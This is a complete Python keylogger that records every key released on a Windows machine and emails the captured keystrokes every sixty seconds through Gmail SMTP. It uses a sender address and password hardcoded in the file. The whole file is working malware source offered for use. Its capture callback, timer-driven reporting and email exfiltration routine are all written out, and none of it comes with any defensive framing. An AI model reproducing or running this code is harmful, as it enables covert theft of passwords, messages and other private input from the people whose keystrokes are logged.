########### Python code to capture the key's in the windows between time interval #######################

import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol(gmail)
# Semaphore is for blocking the current thread
#Timer is to make a method runs after an internal amount of time
from threading import Semaphore, Timer

############# Email Details #############
SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "dubeyveer199768@gmail.com"
EMAIL_PASSWORD = "dR00001111%"

class Keylogger:
	def __init__(self, interval):
		# we gona pass SEND_REPORT_EVERY to interval
		self.interval = interval
		# This is the string variable that contains the log of all the 
		# keystores within 'self.interval'
		self.log = ""
		# for blocking after setting the on_release listener
		self.semaphore = Semaphore(0)

	def callback(self, event):
		# This callback is invoked whenever a keyboard event is occured
		name = event.name
		if len(name) > 1:
			# if not a character, Special Key(e.g ctrl, alt, etc..)
			#uppercase with []
			if name == "space":
				# instead of space
				name = " "
			elif name == "enter":
				# add a new line whenever an ENTER is pressed
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				# replace spaces with underscores
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		self.log += name

	def sendmail(self, email, password, message):
		# manages a connection to the SMTP server
		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
		# Connect to the SMTP server as TLS mode (for security)
		server.starttls()
		# login to the email account
		server.login(email, password)
		# send the acutal message
		server.sendmail(email, email, message)
		# terminates the session
		server.quit()

	def report(self):
		# This function gets called every 'self.interval' 
		# It basically sends keylogs and resets 'self.log' variable
		if self.log:
			# If there is something in log, report it
			self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
		self.log = ""

		Timer(interval=self.interval, function=self.report).start()

	def start(self):
		# start the keylogger
		keyboard.on_release(callback=self.callback)
		#start reporting the keylogs
		self.report()
		# block the current thread,
		#since on_release() doesn't block the current thread
		# if we don't block it, when we execute the program, nothing will happen
		# that is because on_release() will start the listener in a separate threa
		self.semaphore.acquire()

if __name__ == "__main__":
	keylogger = Keylogger(interval = SEND_REPORT_EVERY)
	keylogger.start()
